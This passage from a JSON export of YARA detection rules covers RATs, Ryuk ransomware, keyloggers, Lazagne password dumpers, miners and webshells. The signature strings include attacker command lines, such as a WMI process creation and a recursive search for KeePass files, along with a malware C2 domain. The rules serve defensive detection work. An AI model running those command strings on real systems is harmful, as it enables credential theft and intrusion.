Australian Parliament House network compromise","minimum_yara":"1.7","name":"HKTL_Unknown_Feb19_1_RID2DF9","reference":"https://twitter.com/cyb3rops/status/1097423665472376832","required_modules":[],"rule_hash":"72f3da6804f056fb52a5eaf0ccae6f0c","score":75,"tags":["DEMO","HKTL"]},{"author":"Florian Roth","content":"rule SUSP_EnableContent_String_Gen_RID322C : DEMO FILE GEN OFFICE SUSP T1193 T1203 {\n   meta:\n      description = \"Detects suspicious string that asks to enable active content in Office Doc\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research\"\n      date = \"2019-02-12 13:53:51\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, FILE, GEN, OFFICE, SUSP, T1193, T1203\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $e1 = \"Enable Editing\" fullword ascii\n      $e2 = \"Enable Content\" fullword ascii\n      $e3 = \"Enable editing\" fullword ascii\n      $e4 = \"Enable content\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0xcfd0 and ( $e1 in ( 0 .. 3000 ) or $e2 in ( 0 .. 3000 ) or $e3 in ( 0 .. 3000 ) or $e4 in ( 0 .. 3000 ) or 2 of them )\n}","date":"2019-02-12 13:53:51","description":"Detects suspicious string that asks to enable active content in Office Doc","minimum_yara":"1.7","name":"SUSP_EnableContent_String_Gen_RID322C","reference":"Internal Research","required_modules":[],"rule_hash":"70c79e8178d4628e5dc5a7c76b13b1f6","score":60,"tags":["OFFICE","T1203","T1193","SUSP","DEMO","FILE","GEN"]},{"author":"Florian Roth","content":"rule SUSP_WordDoc_VBA_Macro_Strings_RID323F : DEMO FILE OFFICE SCRIPT SUSP T1193 T1203 {\n   meta:\n      description = \"Detects suspicious strings in Word Doc that indcate malicious use of VBA macros\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research\"\n      date = \"2019-02-12 13:57:01\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, FILE, OFFICE, SCRIPT, SUSP, T1193, T1203\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $a1 = \"\\\\Microsoft Shared\\\\\" ascii\n      $a2 = \"\\\\VBA\\\\\" ascii\n      $a3 = \"Microsoft Office Word\" fullword ascii\n      $a4 = \"PROJECTwm\" fullword wide\n      $s1 = \"AppData\" fullword ascii\n      $s2 = \"Document_Open\" fullword ascii\n      $s3 = \"Project1\" fullword ascii\n      $s4 = \"CreateObject\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0xcfd0 and filesize < 800KB and all of them\n}","date":"2019-02-12 13:57:01","description":"Detects suspicious strings in Word Doc that indcate malicious use of VBA macros","minimum_yara":"1.7","name":"SUSP_WordDoc_VBA_Macro_Strings_RID323F","reference":"Internal Research","required_modules":[],"rule_hash":"578e795fe8211e16b625a652410e4b85","score":60,"tags":["OFFICE","T1203","T1193","SUSP","SCRIPT","DEMO","FILE"]},{"author":"Florian Roth","content":"rule MAL_ExileRAT_Feb19_1_RID2D8E : DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects Exile RAT\"\n      author = \"Florian Roth\"\n      reference = \"https://blog.talosintelligence.com/2019/02/exilerat-shares-c2-with-luckycat.html\"\n      date = \"2019-02-04 10:36:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, MAL\"\n      required_modules = \"pe\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"Content-Disposition:form-data;name=\\\"x.bin\\\"\" fullword ascii\n      $s1 = \"syshost.dll\" fullword ascii\n      $s2 = \"\\\\scout\\\\Release\\\\scout.pdb\" ascii\n      $s3 = \"C:\\\\data.ini\" fullword ascii\n      $s4 = \"my-ip\\\" value=\\\"\" fullword ascii\n      $s5 = \"ver:%d.%d.%d\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 500KB and ( pe.imphash ( ) == \"da8475fc7c3c90c0604ce6a0b56b5f21\" or 3 of them )\n}","date":"2019-02-04 10:36:51","description":"Detects Exile RAT","minimum_yara":"1.7","name":"MAL_ExileRAT_Feb19_1_RID2D8E","reference":"https://blog.talosintelligence.com/2019/02/exilerat-shares-c2-with-luckycat.html","required_modules":["pe"],"rule_hash":"3ee4049b2bccf3722f4339f58aeb5362","score":75,"tags":["DEMO","EXE","FILE","MAL"]},{"author":"Florian Roth","content":"rule SUSP_Katz_PDB_RID2B8A : DEMO EXE FILE SUSP {\n   meta:\n      description = \"Detects suspicious PDB in file\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research\"\n      date = \"2019-02-04 09:10:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, SUSP\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = /\\\\Release\\\\[a-z]{0,8}katz.pdb/ \n      $s2 = /\\\\Debug\\\\[a-z]{0,8}katz.pdb/ \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 6000KB and all of them\n}","date":"2019-02-04 09:10:51","description":"Detects suspicious PDB in file","minimum_yara":"1.7","name":"SUSP_Katz_PDB_RID2B8A","reference":"Internal Research","required_modules":[],"rule_hash":"4e8343e402d3ffa838b2401bec6e5b05","score":75,"tags":["SUSP","DEMO","EXE","FILE"]},{"author":"Florian Roth","content":"rule PUA_CryptoMiner_Jan19_1_RID2F44 : DEMO MAL {\n   meta:\n      description = \"Detects Crypto Miner strings\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research\"\n      date = \"2019-01-31 11:49:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Stratum notify: invalid Merkle branch\" fullword ascii\n      $s2 = \"-t, --threads=N       number of miner threads (default: number of processors)\" fullword ascii\n      $s3 = \"User-Agent: cpuminer/\" ascii\n      $s4 = \"hash > target (false positive)\" fullword ascii\n      $s5 = \"thread %d: %lu hashes, %s khash/s\" fullword ascii\n   condition: \n      filesize < 1000KB and 1 of them\n}","date":"2019-01-31 11:49:51","description":"Detects Crypto Miner strings","minimum_yara":"1.7","name":"PUA_CryptoMiner_Jan19_1_RID2F44","reference":"Internal Research","required_modules":[],"rule_hash":"7c46cdd3e29ce0eec3dd617ba817f6cf","score":75,"tags":["DEMO","MAL"]},{"author":"Florian Roth","content":"rule APT_MAL_DNS_Hijacking_Campaign_AA19_024A_RID345A : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects malware used in DNS Hijackign campaign\"\n      author = \"Florian Roth\"\n      reference = \"https://www.us-cert.gov/ncas/alerts/AA19-024A\"\n      date = \"2019-01-25 15:26:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s2 = \"/Client/Login?id=\" fullword ascii\n      $s3 = \"Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko\" fullword ascii\n      $s4 = \".\\\\Configure.txt\" fullword ascii\n      $s5 = \"Content-Disposition: form-data; name=\\\"files\\\"; filename=\\\"\" fullword ascii\n      $s6 = \"Content-Disposition: form-data; name=\\\"txts\\\"\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 1000KB and 2 of them\n}","date":"2019-01-25 15:26:51","description":"Detects malware used in DNS Hijackign campaign","minimum_yara":"1.7","name":"APT_MAL_DNS_Hijacking_Campaign_AA19_024A_RID345A","reference":"https://www.us-cert.gov/ncas/alerts/AA19-024A","required_modules":[],"rule_hash":"74a54b611b333f749e264b527b244c1a","score":75,"tags":["APT","DEMO","EXE","FILE"]},{"author":"Florian Roth","content":"rule SUSP_RTF_Header_Anomaly_RID2F7F : DEMO FILE SUSP {\n   meta:\n      description = \"Detects malformed RTF header often used to trick mechanisms that check for a full RTF header\"\n      author = \"Florian Roth\"\n      reference = \"https://twitter.com/ItsReallyNick/status/975705759618158593\"\n      date = \"2019-01-20 11:59:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, FILE, SUSP\"\n      minimum_yara = \"1.7\"\n      \n   condition: \n      uint32 ( 0 ) == 0x74725c7b and not uint8 ( 4 ) == 0x66\n}","date":"2019-01-20 11:59:41","description":"Detects malformed RTF header often used to trick mechanisms that check for a full RTF header","minimum_yara":"1.7","name":"SUSP_RTF_Header_Anomaly_RID2F7F","reference":"https://twitter.com/ItsReallyNick/status/975705759618158593","required_modules":[],"rule_hash":"283653751850fd301eaaf090edb31f1b","score":75,"tags":["SUSP","DEMO","FILE"]},{"author":"Florian Roth","content":"rule Webshell_Tiny_ASP_Jan19_1_RID2FFF : DEMO FILE T1100 WEBSHELL {\n   meta:\n      description = \"Detects a Tiny ASP webshell\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research\"\n      date = \"2019-01-16 12:21:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, FILE, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Execute Request\" ascii wide nocase\n   condition: \n      uint16 ( 0 ) == 0x253c and filesize < 150 and 1 of them\n}","date":"2019-01-16 12:21:01","description":"Detects a Tiny ASP webshell","minimum_yara":"1.7","name":"Webshell_Tiny_ASP_Jan19_1_RID2FFF","reference":"Internal Research","required_modules":[],"rule_hash":"e7ea7c96a132ab8d7ab174537dda38f0","score":75,"tags":["T1100","DEMO","WEBSHELL","FILE"]},{"author":"Florian Roth","content":"rule MAL_CrypRAT_Jan19_1_RID2D41 : DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects CrypRAT\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research\"\n      date = \"2019-01-07 10:24:01\"\n      score = 90\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, MAL\"\n      required_modules = \"pe\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"Cryp_RAT\" fullword wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 600KB and ( pe.imphash ( ) == \"2524e5e9fe04d7bfe5efb3a5e400fe4b\" or 1 of them )\n}","date":"2019-01-07 10:24:01","description":"Detects CrypRAT","minimum_yara":"1.7","name":"MAL_CrypRAT_Jan19_1_RID2D41","reference":"Internal Research","required_modules":["pe"],"rule_hash":"e5edbfef12bb6a7862c06c4ce24e4880","score":90,"tags":["DEMO","EXE","FILE","MAL"]},{"author":"Florian Roth","content":"rule SUSP_Putty_Unnormal_Size_RID3086 : ANOMALY DEMO EXE FILE SUSP T1021 {\n   meta:\n      description = \"Detects a putty version with a size different than the one provided by Simon Tatham (could be caused by an additional signature or malware)\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research\"\n      date = \"2019-01-07 12:43:31\"\n      score = 50\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"ANOMALY, DEMO, EXE, FILE, SUSP, T1021\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"SSH, Telnet and Rlogin client\" fullword wide\n      $v1 = \"Release 0.6\" wide\n      $v2 = \"Release 0.70\" wide\n      $fp1 = \"KiTTY fork\" fullword wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and $s1 and 1 of ( $v* ) and not 1 of ( $fp* ) and filesize != 524288 and filesize != 495616 and filesize != 483328 and filesize != 524288 and filesize != 712176 and filesize != 828400 and filesize != 569328 and filesize != 454656 and filesize != 531368 and filesize != 524288 and filesize != 483328 and filesize != 713592 and filesize != 829304 and filesize != 571256 and filesize != 774200 and filesize != 854072 and filesize != 665144 and filesize != 774200 and filesize != 854072 and filesize != 665144\n}","date":"2019-01-07 12:43:31","description":"Detects a putty version with a size different than the one provided by Simon Tatham (could be caused by an additional signature or malware)","minimum_yara":"1.7","name":"SUSP_Putty_Unnormal_Size_RID3086","reference":"Internal Research","required_modules":[],"rule_hash":"741f7d491478d22036feb4ad09919355","score":50,"tags":["SUSP","T1021","DEMO","FILE","EXE","ANOMALY"]},{"author":"Florian Roth","content":"rule SUSP_JAVA_Class_with_VBS_Content_RID32D1 : DEMO FILE SCRIPT SUSP {\n   meta:\n      description = \"Detects a JAVA class file with strings known from VBS files\"\n      author = \"Florian Roth\"\n      reference = \"https://www.menlosecurity.com/blog/a-jar-full-of-problems-for-financial-services-companies\"\n      date = \"2019-01-03 14:21:21\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, FILE, SCRIPT, SUSP\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $a1 = \"java/lang/String\" ascii\n      $s1 = \".vbs\" ascii\n      $s2 = \"createNewFile\" fullword ascii\n      $s3 = \"wscript\" fullword ascii nocase\n   condition: \n      uint16 ( 0 ) == 0xfeca and filesize < 100KB and $a1 and 3 of ( $s* )\n}","date":"2019-01-03 14:21:21","description":"Detects a JAVA class file with strings known from VBS files","minimum_yara":"1.7","name":"SUSP_JAVA_Class_with_VBS_Content_RID32D1","reference":"https://www.menlosecurity.com/blog/a-jar-full-of-problems-for-financial-services-companies","required_modules":[],"rule_hash":"2d8cb05f3262ed4c4b1ee1b99129f4d2","score":60,"tags":["SUSP","DEMO","SCRIPT","FILE"]},{"author":"Florian Roth","content":"rule MAL_Ryuk_Ransomware_RID2E73 : CRIME DEMO EXE FILE MAL RANSOM {\n   meta:\n      description = \"Detects strings known from Ryuk Ransomware\"\n      author = \"Florian Roth\"\n      reference = \"https://research.checkpoint.com/ryuk-ransomware-targeted-campaign-break/\"\n      date = \"2018-12-31 11:15:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"CRIME, DEMO, EXE, FILE, MAL, RANSOM\"\n      required_modules = \"pe\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"/v \\\"svchos\\\" /f\" fullword wide\n      $x2 = \"\\\\Documents and Settings\\\\Default User\\\\finish\" fullword wide\n      $x3 = \"\\\\users\\\\Public\\\\finish\" fullword wide\n      $x4 = \"lsaas.exe\" fullword wide\n      $x5 = \"RyukReadMe.txt\" fullword wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 400KB and ( pe.imphash ( ) == \"4a069c1abe5aca148d5a8fdabc26751e\" or pe.imphash ( ) == \"dc5733c013378fa418d13773f5bfe6f1\" or 1 of them )\n}","date":"2018-12-31 11:15:01","description":"Detects strings known from Ryuk Ransomware","minimum_yara":"1.7","name":"MAL_Ryuk_Ransomware_RID2E73","reference":"https://research.checkpoint.com/ryuk-ransomware-targeted-campaign-break/","required_modules":["pe"],"rule_hash":"98701b4936d6ae65267b023e00bdb632","score":75,"tags":["RANSOM","MAL","DEMO","EXE","FILE","CRIME"]},{"author":"Florian Roth","content":"rule SUSP_XMRIG_String_RID2D18 : DEMO EXE FILE SUSP {\n   meta:\n      description = \"Detects a suspicious XMRIG crypto miner executable string in filr\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research\"\n      date = \"2018-12-28 10:17:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, SUSP\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"xmrig.exe\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 2000KB and 1 of them\n}","date":"2018-12-28 10:17:11","description":"Detects a suspicious XMRIG crypto miner executable string in filr","minimum_yara":"1.7","name":"SUSP_XMRIG_String_RID2D18","reference":"Internal Research","required_modules":[],"rule_hash":"79c20663f29d32bdaa0806d8ad45f355","score":75,"tags":["SUSP","DEMO","EXE","FILE"]},{"author":"Florian Roth","content":"rule HKTL_NoPowerShell_RID2D65 : DEMO HKTL SCRIPT T1086 {\n   meta:\n      description = \"Detects NoPowerShell hack tool\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/bitsadmin/nopowershell\"\n      date = \"2018-12-28 10:30:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, HKTL, SCRIPT, T1086\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"\\\\NoPowerShell.pdb\" fullword ascii\n      $x2 = \"Invoke-WmiMethod -Class Win32_Process -Name Create \\\"cmd\" fullword wide\n      $x3 = \"ls C:\\\\Windows\\\\System32 -Include *.exe | select -First 10 Name,Length\" fullword wide\n      $x4 = \"ls -Recurse -Force C:\\\\Users\\\\ -Include *.kdbx\" fullword wide\n      $x5 = \"NoPowerShell.exe\" fullword wide\n   condition: \n      1 of them\n}","date":"2018-12-28 10:30:01","description":"Detects NoPowerShell hack tool","minimum_yara":"1.7","name":"HKTL_NoPowerShell_RID2D65","reference":"https://github.com/bitsadmin/nopowershell","required_modules":[],"rule_hash":"68bbae7e3cfd114d9e4803c74cc4615c","score":75,"tags":["DEMO","T1086","SCRIPT","HKTL"]},{"author":"Florian Roth","content":"rule APT_APT10_Malware_Imphash_Dec18_1_RID3250 : APT CHINA DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects APT10 malware based on ImpHashes\"\n      author = \"Florian Roth\"\n      reference = \"AlienVault OTX IOCs - statistical sample analysis\"\n      date = \"2018-12-28 13:59:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, CHINA, DEMO, EXE, FILE, MAL\"\n      required_modules = \"pe\"\n      minimum_yara = \"1.7\"\n      \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 6000KB and ( pe.imphash ( ) == \"0556ff5e5f8744bff47d4921494ba46d\" or pe.imphash ( ) == \"cb1194123f68a68eb14552c085b620ce\" or pe.imphash ( ) == \"efad9ff8c0d2a6419bf1dd970bcd806d\" or pe.imphash ( ) == \"7a861cd9c495e1d950a43cb708a22985\" or pe.imphash ( ) == \"a5d0545030be75a421529c2b0be6c4bd\" or pe.imphash ( ) == \"94491f4a812b0297419dc888aa4fd2a5\" )\n}","date":"2018-12-28 13:59:51","description":"Detects APT10 malware based on ImpHashes","minimum_yara":"1.7","name":"APT_APT10_Malware_Imphash_Dec18_1_RID3250","reference":"AlienVault OTX IOCs - statistical sample analysis","required_modules":["pe"],"rule_hash":"6e2087b6abb48da2f67d25c43a8d95b1","score":75,"tags":["MAL","DEMO","FILE","APT","CHINA","EXE"]},{"author":"Florian Roth","content":"rule SUSP_Obfuscted_PowerShell_Code_RID3298 : DEMO OBFUS SCRIPT SUSP T1027 T1086 {\n   meta:\n      description = \"Detects obfuscated PowerShell Code\"\n      author = \"Florian Roth\"\n      reference = \"https://twitter.com/silv0123/status/1073072691584880640\"\n      date = \"2018-12-13 14:11:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, OBFUS, SCRIPT, SUSP, T1027, T1086\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"').Invoke(\" ascii\n      $s2 = \"(\\\"{1}{0}\\\"\" ascii\n      $s3 = \"{0}\\\" -f\" ascii\n   condition: \n      #s1 > 11 and #s2 > 10 and #s3 > 10\n}","date":"2018-12-13 14:11:51","description":"Detects obfuscated PowerShell Code","minimum_yara":"1.7","name":"SUSP_Obfuscted_PowerShell_Code_RID3298","reference":"https://twitter.com/silv0123/status/1073072691584880640","required_modules":[],"rule_hash":"19742879f1efffc4911dc8141768a00c","score":75,"tags":["OBFUS","SUSP","SCRIPT","DEMO","T1027","T1086"]},{"author":"Florian Roth","content":"rule SUSP_ELF_LNX_UPX_Compressed_File_RID3292 : DEMO FILE LINUX SUSP T1045 {\n   meta:\n      description = \"Detects a suspicious ELF binary with UPX compression\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research\"\n      date = \"2018-12-12 14:10:51\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, FILE, LINUX, SUSP, T1045\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"PROT_EXEC|PROT_WRITE failed.\" fullword ascii\n      $s2 = \"$Id: UPX\" fullword ascii\n      $s3 = \"$Info: This file is packed with the UPX executable packer\" ascii\n      $fp1 = \"check your UCL installation !\" \n   condition: \n      uint16 ( 0 ) == 0x457f and filesize < 2000KB and filesize > 30KB and 2 of ( $s* ) and not 1 of ( $fp* )\n}","date":"2018-12-12 14:10:51","description":"Detects a suspicious ELF binary with UPX compression","minimum_yara":"1.7","name":"SUSP_ELF_LNX_UPX_Compressed_File_RID3292","reference":"Internal Research","required_modules":[],"rule_hash":"ab3945a2d641640e284cb006b48b4cbb","score":40,"tags":["SUSP","DEMO","LINUX","T1045","FILE"]},{"author":"Florian Roth","content":"rule SUSP_Modified_SystemExeFileName_in_File_RID35F8 : DEMO EXE FILE SUSP {\n   meta:\n      description = \"Detecst a variant of a system file name often used by attackers to cloak their activity\"\n      author = \"Florian Roth\"\n      reference = \"https://www.symantec.com/blogs/threat-intelligence/seedworm-espionage-group\"\n      date = \"2018-12-11 16:35:51\"\n      score = 65\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, SUSP\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"svchosts.exe\" fullword wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 200KB and 1 of them\n}","date":"2018-12-11 16:35:51","description":"Detecst a variant of a system file name often used by attackers to cloak their activity","minimum_yara":"1.7","name":"SUSP_Modified_SystemExeFileName_in_File_RID35F8","reference":"https://www.symantec.com/blogs/threat-intelligence/seedworm-espionage-group","required_modules":[],"rule_hash":"82b7ee96542c85910d615a2f83340a37","score":65,"tags":["SUSP","DEMO","EXE","FILE"]},{"author":"Florian Roth","content":"rule HKTL_Lazagne_PasswordDumper_Dec18_1_RID33E8 : DEMO EXE FILE HKTL T1003 {\n   meta:\n      description = \"Detects password dumper Lazagne often used by middle eastern threat groups\"\n      author = \"Florian Roth\"\n      reference = \"https://www.symantec.com/blogs/threat-intelligence/seedworm-espionage-group\"\n      date = \"2018-12-11 15:07:51\"\n      score = 85\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, HKTL, T1003\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"softwares.opera(\" fullword ascii\n      $s2 = \"softwares.mozilla(\" fullword ascii\n      $s3 = \"config.dico(\" fullword ascii\n      $s4 = \"softwares.chrome(\" fullword ascii\n      $s5 = \"softwares.outlook(\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 17000KB and 1 of them\n}","date":"2018-12-11 15:07:51","description":"Detects password dumper Lazagne often used by middle eastern threat groups","minimum_yara":"1.7","name":"HKTL_Lazagne_PasswordDumper_Dec18_1_RID33E8","reference":"https://www.symantec.com/blogs/threat-intelligence/seedworm-espionage-group","required_modules":[],"rule_hash":"19b29fa95bc6375a6ae34c98bec99215","score":85,"tags":["DEMO","EXE","T1003","FILE","HKTL"]},{"author":"Florian Roth","content":"rule HKTL_Lazagne_Gen_18_RID2DA6 : DEMO GEN HKTL T1003 {\n   meta:\n      description = \"Detects Lazagne password extractor hacktool\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/AlessandroZ/LaZagne\"\n      date = \"2018-12-11 10:40:51\"\n      score = 80\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, GEN, HKTL, T1003\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"lazagne.config.powershell_execute(\" fullword ascii\n      $x2 = \"creddump7.win32.\" ascii\n      $x3 = \"lazagne.softwares.windows.hashdump\" ascii\n      $x4 = \".softwares.memory.libkeepass.common(\" ascii\n   condition: \n      2 of them\n}","date":"2018-12-11 10:40:51","description":"Detects Lazagne password extractor hacktool","minimum_yara":"1.7","name":"HKTL_Lazagne_Gen_18_RID2DA6","reference":"https://github.com/AlessandroZ/LaZagne","required_modules":[],"rule_hash":"0ba7ad0382ef504e7d469b00ace3f8d2","score":80,"tags":["DEMO","T1003","GEN","HKTL"]},{"author":"Florian Roth","content":"rule MAL_HawkEye_Keylogger_Gen_Dec18_RID324D : DEMO GEN HKTL MAL T1056 T1113 {\n   meta:\n      description = \"Detects HawkEye Keylogger Reborn\"\n      author = \"Florian Roth\"\n      reference = \"https://twitter.com/James_inthe_box/status/1072116224652324870\"\n      date = \"2018-12-10 13:59:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, GEN, HKTL, MAL, T1056, T1113\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"HawkEye Keylogger\" fullword wide\n      $s2 = \"_ScreenshotLogger\" fullword ascii\n      $s3 = \"_PasswordStealer\" fullword ascii\n   condition: \n      2 of them\n}","date":"2018-12-10 13:59:21","description":"Detects HawkEye Keylogger Reborn","minimum_yara":"1.7","name":"MAL_HawkEye_Keylogger_Gen_Dec18_RID324D","reference":"https://twitter.com/James_inthe_box/status/1072116224652324870","required_modules":[],"rule_hash":"e5ec95cb11e0a5f57689fcc76cb13173","score":75,"tags":["T1113","MAL","DEMO","T1056","GEN","HKTL"]},{"author":"Florian Roth","content":"rule SUSP_Scheduled_Task_BigSize_RID314A : DEMO FILE SCRIPT SUSP T1053 T1086 T1132 {\n   meta:\n      description = \"Detects suspiciously big scheduled task XML file as seen in combination with embedded base64 encoded PowerShell code\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research\"\n      date = \"2018-12-06 13:16:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, FILE, SCRIPT, SUSP, T1053, T1086, T1132\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $a0 = \"<Task version=\" ascii wide\n      $a1 = \"xmlns=\\\"http://schemas.microsoft.com/windows/\" ascii wide\n      $fp1 = \"</Counter><Counter>\" wide\n      $fp2 = \"Office Feature Updates Logon\" wide\n      $fp3 = \"Microsoft Shared\" fullword wide\n   condition: \n      uint16 ( 0 ) == 0xfeff and filesize > 20KB and all of ( $a* ) and not 1 of ( $fp* )\n}","date":"2018-12-06 13:16:11","description":"Detects suspiciously big scheduled task XML file as seen in combination with embedded base64 encoded PowerShell code","minimum_yara":"1.7","name":"SUSP_Scheduled_Task_BigSize_RID314A","reference":"Internal Research","required_modules":[],"rule_hash":"7d1e4d8baeb5d9ba9a9d07c84afaaa4c","score":75,"tags":["T1132","SUSP","SCRIPT","DEMO","T1053","FILE","T1086"]},{"author":"Florian Roth","content":"rule SUSP_PiratedOffice_2007_RID2EF8 : DEMO FILE OFFICE SUSP T1193 T1203 {\n   meta:\n      description = \"Detects an Office document that was created with a pirated version of MS Office 2007\"\n      author = \"Florian Roth\"\n      reference = \"https://twitter.com/pwnallthethings/status/743230570440826886?lang=en\"\n      date = \"2018-12-04 11:37:11\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, FILE, OFFICE, SUSP, T1193, T1203\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s7 = \"<Company>Grizli777</Company>\" ascii\n   condition: \n      uint16 ( 0 ) == 0xcfd0 and filesize < 300KB and all of them\n}","date":"2018-12-04 11:37:11","description":"Detects an Office document that was created with a pirated version of MS Office 2007","minimum_yara":"1.7","name":"SUSP_PiratedOffice_2007_RID2EF8","reference":"https://twitter.com/pwnallthethings/status/743230570440826886?lang=en","required_modules":[],"rule_hash":"5f735a9d72877ccd134931a727082232","score":40,"tags":["OFFICE","T1203","T1193","SUSP","DEMO","FILE"]},{"author":"Florian Roth","content":"rule MAL_DNSPIONAGE_Malware_Nov18_RID3055 : DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects DNSpionage Malware\"\n      author = \"Florian Roth\"\n      reference = \"https://blog.talosintelligence.com/2018/11/dnspionage-campaign-targets-middle-east.html\"\n      date = \"2018-11-30 12:35:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \".0ffice36o.com\" fullword ascii\n      $s1 = \"/Client/Login?id=\" fullword ascii\n      $s2 = \".\\\\Configure.txt\" fullword ascii\n      $s5 = \"Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko\" fullword ascii\n      $s6 = \"Content-Disposition: form-data; name=\\\"txts\\\"\" fullword ascii\n  